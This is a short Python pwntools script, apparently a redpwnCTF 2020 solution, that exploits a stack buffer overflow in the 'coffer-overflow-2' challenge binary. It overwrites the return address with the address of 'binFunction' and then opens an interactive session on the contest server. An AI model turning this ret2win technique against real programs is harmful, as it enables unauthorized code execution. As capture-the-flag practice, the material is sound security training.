#!/usr/bin/env python2
from pwn import *
context(os="linux", arch="amd64")
context.terminal = ['zsh', '-e', 'sh', '-c']

elf = ELF('coffer-overflow-2')
ret2win = elf.symbols['binFunction']

exe = remote('2020.redpwnc.tf', 31908)
#exe = process('./coffer-overflow-2')
exe.readuntil('What do you want to fill your coffer with?')

buf = '\x90' * 24 + p64(ret2win)
exe.sendline(buf)
exe.interactive()
